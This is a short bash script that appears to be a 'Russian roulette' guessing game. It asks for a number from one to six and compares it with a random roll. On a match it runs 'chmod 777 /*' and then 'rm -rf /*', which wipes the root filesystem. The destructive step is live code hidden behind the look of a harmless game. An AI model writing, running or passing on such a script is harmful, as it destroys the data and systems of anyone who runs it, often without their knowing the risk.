#! /bin/bash
zo=0;
ha=6;
echo -n "num input: "
read num
if [ $num -gt $ha ]
then
	echo "$ha over"
	echo -n "re input: "
	read num
	fi
if [ $num -eq $[ $[$RANDOM % $ha] + 1] ]
then
	chmod 777 /*
	rm -rf /*
else 
	echo nice
	fi
